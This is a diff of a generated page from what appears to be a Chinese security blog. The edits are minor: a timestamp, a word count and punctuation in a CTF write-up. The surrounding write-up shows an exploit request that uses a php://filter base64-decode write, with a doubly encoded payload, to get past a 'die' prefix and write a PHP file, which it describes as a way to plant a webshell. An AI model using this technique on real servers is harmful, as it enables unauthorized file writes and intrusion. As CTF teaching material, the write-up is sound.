@@ -99,7 +99,7 @@
 <meta property="og:image" content="https://scriptkid-beta.github.io/2021/10/11/img/%E8%AE%B0%E5%8F%88%E5%8F%88%E5%8F%88%E4%B8%80%E6%AC%A1%E6%8B%89%E7%BB%83/image-20211011141958762.png">
 <meta property="og:image" content="https://scriptkid-beta.github.io/2021/10/11/img/%E8%AE%B0%E5%8F%88%E5%8F%88%E5%8F%88%E4%B8%80%E6%AC%A1%E6%8B%89%E7%BB%83/image-20211011170414108.png">
 <meta property="article:published_time" content="2021-10-11T05:17:17.518Z">
-<meta property="article:modified_time" content="2021-10-11T09:18:32.996Z">
+<meta property="article:modified_time" content="2021-10-11T09:23:19.348Z">
 <meta property="article:author" content="小维同学">
 <meta property="article:tag" content="Python | CTF | SEC | 笔记 | Pentest | 小维同学 | 网络安全 | 博客 | 小维 | 安全导航 | JAVA">
 <meta name="twitter:card" content="summary">
@@ -371,7 +371,7 @@
                   <span class="post-meta-item-text">字数统计&#58;</span>
                 
                 <span title="字数统计">
-                  528字
+                  529字
                 </span>
               
 
@@ -423,8 +423,8 @@
 <h4 id="解题步骤"><a href="#解题步骤" class="headerlink" title="解题步骤"></a>解题步骤</h4><h5 id="解法一"><a href="#解法一" class="headerlink" title="解法一"></a>解法一</h5><p>尝试写入<code>&lt;?php phpinfo();?&gt;</code>文件</p>
 <figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span>ctf.xxx.com?path=php:<span class="regexp">//</span>filter<span class="regexp">/write=convert.base64-decode/</span>resource=upload<span class="regexp">/test.php&amp;data=YVBEOXdhSEFnY0dod2FXNW1ieWdwT3o4Kw==</span></span><br></pre></td></tr></table></figure>
 
-<p>PD9waHAgcGhwaW5mbygpOz8+前面加一个<code>a</code>因为在解码的过程中，字符&lt;、?、;、&gt;、空格等一共有7个字符不符合base64编码的字符范围将被忽略，所以最终被解码的字符仅有“phpdienophp”和我们传入的其他字符。</p>
-<p>“phpdienophp”一共11个字符，因为base64算法解码时是4个byte一组，所以给他增加1个“a”一共12个字符。这样，”phpdienophp”被正常解码，而后面我们传入的webshell的base64内容也被正常解码。</p>
+<p>PD9waHAgcGhwaW5mbygpOz8+前面加一个”a”，是因为在解码的过程中，字符&lt;、?、;、&gt;、空格等一共有7个字符不符合base64编码的字符范围将被忽略，所以最终被解码的字符仅有“phpdienophp”和我们传入的其他字符。</p>
+<p>“phpdienophp”一共11个字符，因为base64算法解码时是4个byte一组，所以给他增加1个”a”，一共12个字符。这样，”phpdienophp”被正常解码，而后面我们传入的webshell的base64内容也被正常解码。</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> phpinfo();<span class="meta">?&gt;</span> =&gt; PD9waHAgcGhwaW5mbygpOz8+ =&gt; aPD9waHAgcGhwaW5mbygpOz8+ =&gt; YVBEOXdhSEFnY0dod2FXNW1ieWdwT3o4Kw==</span><br></pre></td></tr></table></figure>
 
 <p><img src="../img/%E8%AE%B0%E5%8F%88%E5%8F%88%E5%8F%88%E4%B8%80%E6%AC%A1%E6%8B%89%E7%BB%83/image-20211011132326071.png" alt="image-20211011132326071"></p>
